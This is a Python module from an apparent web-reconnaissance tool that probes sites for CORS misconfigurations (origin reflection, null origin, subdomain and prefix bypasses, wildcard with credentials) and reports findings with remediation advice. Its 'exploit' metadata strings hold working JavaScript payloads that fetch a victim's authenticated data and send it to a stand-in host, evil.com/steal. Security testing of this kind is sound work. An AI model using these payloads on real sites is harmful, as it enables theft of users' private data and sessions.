"""
CORS misconfiguration scanner for WebRipper Recon.

Sends active HTTP requests with crafted Origin headers to detect
dangerous CORS configurations that allow cross-origin data theft.
"""

from __future__ import annotations

import asyncio
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse

import aiohttp

from .base import BaseScanner
from ..models import Finding, ScanResult, Severity


class CORSScanner(BaseScanner):
    """Probes for CORS misconfigurations via active Origin header testing."""

    @property
    def name(self) -> str:
        return "cors"

    @property
    def description(self) -> str:
        return "Tests for CORS misconfigurations that allow cross-origin data theft"

    def scan(self) -> ScanResult:
        start = time.time()
        parsed = urlparse(self._settings.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        host = parsed.hostname or parsed.netloc

        self._log(f"Testing CORS configuration on {base}")

        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._test_cors(base, host))
            loop.close()
        except Exception as exc:
            self._log(f"CORS test error: {exc}")

        self._log(f"CORS scan complete: {len(self._findings)} findings")
        return self._build_result(start, target=base)

    async def _test_cors(self, base_url: str, host: str) -> None:
        timeout = aiohttp.ClientTimeout(total=min(self._settings.timeout, 15))
        connector = aiohttp.TCPConnector(ssl=False)
        headers = self._build_headers()
        proxy = self._get_proxy()

        urls_to_test = [base_url]
        captured = getattr(self._report, "captured_requests", [])
        for req in captured:
            u = req.get("url", "").split("?")[0]
            if u and u.startswith(base_url) and u not in urls_to_test:
                urls_to_test.append(u)
                if len(urls_to_test) >= 4:
                    break

        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers,
            max_line_size=131072,
            max_field_size=131072,
        ) as session:
            for test_url in urls_to_test:
                # Test 1: Arbitrary origin reflection
                await self._test_origin(session, test_url, "https://evil-attacker.com", proxy, host)

                # Test 2: Null origin
                await self._test_origin(session, test_url, "null", proxy, host)

                # Test 3: Subdomain of target
                await self._test_origin(session, test_url, f"https://evil.{host}", proxy, host)

                # Test 4: Prefix match bypass
                await self._test_origin(session, test_url, f"https://{host}.evil.com", proxy, host)

                # Test 5: Check if credentials are allowed with wildcard
                await self._test_credentials(session, test_url, proxy)

    async def _test_origin(
        self, session: aiohttp.ClientSession,
        url: str, origin: str, proxy: Optional[str], host: str,
    ) -> None:
        try:
            test_headers = {"Origin": origin}
            async with session.get(url, headers=test_headers, proxy=proxy) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                if not acao:
                    return

                if origin == "null" and acao == "null":
                    self._add_finding(Finding(
                        severity=Severity.HIGH,
                        category="cors",
                        title="CORS allows null Origin",
                        description="Server accepts 'null' as a valid origin, exploitable from sandboxed iframes.",
                        evidence=f"Origin: null → ACAO: {acao}, ACAC: {acac}",
                        url=url,
                        remediation="Never whitelist 'null' as an allowed origin. Remove null from CORS configuration.",
                        metadata={
                            "exploit": (
                                "An attacker creates a sandboxed iframe: <iframe sandbox='allow-scripts' "
                                "src='data:text/html,<script>fetch(\"TARGET\",{credentials:\"include\"})"
                                ".then(r=>r.text()).then(d=>navigator.sendBeacon(\"https://evil.com/steal\",d))"
                                "</script>'> — The iframe's origin is 'null', which the server accepts. "
                                "The attacker reads the victim's authenticated data."
                            ),
                            "impact": "Cross-origin data theft, session hijacking, account information leakage",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~5 minutes",
                        },
                    ))

                elif origin == "https://evil-attacker.com" and acao == origin:
                    sev = Severity.CRITICAL if acac.lower() == "true" else Severity.HIGH
                    self._add_finding(Finding(
                        severity=sev,
                        category="cors",
                        title="CORS reflects arbitrary Origin",
                        description="Server echoes back any Origin in Access-Control-Allow-Origin, allowing any website to read responses.",
                        evidence=f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                        url=url,
                        remediation="Configure CORS to allow only specific trusted origins. Never reflect the Origin header blindly.",
                        metadata={
                            "exploit": (
                                "Attacker hosts evil.com with: fetch('TARGET/api/user/profile', "
                                "{credentials:'include'}).then(r=>r.json()).then(data=>"
                                "fetch('https://evil.com/steal',{method:'POST',body:JSON.stringify(data)})). "
                                "When a logged-in victim visits evil.com, the script makes authenticated requests "
                                "to the target and reads the full response — stealing private user data, tokens, "
                                "and session information."
                            ),
                            "impact": "Full cross-origin data theft — equivalent to XSS. Attacker reads any authenticated API response.",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~5 minutes",
                        },
                    ))

                elif origin.startswith("https://evil.") and acao == origin:
                    self._add_finding(Finding(
                        severity=Severity.HIGH,
                        category="cors",
                        title="CORS trusts arbitrary subdomains",
                        description=f"Server accepts subdomain {origin} as trusted origin.",
                        evidence=f"Origin: {origin} → ACAO: {acao}",
                        url=url,
                        remediation="Validate the full origin against an allowlist, not just the domain suffix.",
                        metadata={
                            "exploit": (
                                "If ANY subdomain has an XSS vulnerability or can be taken over, the attacker "
                                "uses it to make cross-origin requests to the main app. Even a forgotten "
                                "old-blog.target.com with a WordPress XSS becomes a full data-theft vector."
                            ),
                            "impact": "Cross-origin data theft via subdomain compromise",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~15 minutes (requires subdomain XSS)",
                        },
                    ))

                elif origin.endswith(".evil.com") and acao == origin:
                    self._add_finding(Finding(
                        severity=Severity.HIGH,
                        category="cors",
                        title="CORS prefix bypass — trusts target.com.evil.com",
                        description="Server validates origin by prefix match, allowing attacker-controlled domains.",
                        evidence=f"Origin: {origin} → ACAO: {acao}",
                        url=url,
                        remediation="Use exact origin matching, not string prefix/suffix matching.",
                        metadata={
                            "exploit": (
                                "Attacker registers targetsite.com.evil.com. The server's regex matches "
                                "it as a 'trusted' origin because it starts with the target domain. "
                                "The attacker then reads authenticated responses from the real site."
                            ),
                            "impact": "Cross-origin data theft via domain confusion",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~10 minutes",
                        },
                    ))

                # Check wildcard once per URL
                if acao == "*" and origin == "https://evil-attacker.com":
                    sev = Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM
                    title_suffix = " with credentials enabled" if acac.lower() == "true" else ""
                    self._add_finding(Finding(
                        severity=sev,
                        category="cors",
                        title=f"CORS wildcard (*){title_suffix} allows any origin: {urlparse(url).path or '/'}",
                        description=(
                            "Access-Control-Allow-Origin is set to *, allowing any website to read responses."
                            + (" Also enables Access-Control-Allow-Credentials, which is an invalid spec combination indicating severe CORS misconfiguration." if acac.lower() == "true" else "")
                        ),
                        evidence=f"ACAO: * (credentials: {acac})",
                        url=url,
                        remediation="Restrict CORS to specific trusted origins instead of using wildcard. Never combine wildcard ACAO with Allow-Credentials.",
                        metadata={
                            "exploit": (
                                "Any website can make requests and read responses. If the endpoint returns "
                                "non-public data, it's exposed. Note: browsers block credentials with wildcard, "
                                "so this is mainly a risk for APIs that don't require authentication."
                            ),
                            "impact": "Public data exposure to any origin. Lower risk if no sensitive data in responses.",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~2 minutes",
                        },
                    ))

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            pass

    async def _test_credentials(
        self, session: aiohttp.ClientSession, url: str, proxy: Optional[str],
    ) -> None:
        """Check if wildcard ACAO is combined with Allow-Credentials."""
        try:
            async with session.get(url, headers={"Origin": "https://attacker.com"}, proxy=proxy) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "*" and acac.lower() == "true":
                    self._add_finding(Finding(
                        severity=Severity.CRITICAL,
                        category="cors",
                        title="CORS wildcard with credentials — browser will reject but misconfigured",
                        description="ACAO:* with ACAC:true is invalid per spec but indicates broken CORS logic.",
                        evidence=f"ACAO: *, ACAC: true",
                        url=url,
                        remediation="Fix CORS implementation. Wildcard cannot be used with credentials.",
                        metadata={
                            "exploit": "Browsers reject this combo, but it indicates the server has broken CORS logic that likely reflects origins in other contexts.",
                            "impact": "Indicates vulnerable CORS implementation that may be exploitable with specific Origin values",
                            "cwe": "CWE-942",
                            "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~5 minutes to test other bypasses",
                        },
                    ))
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            pass
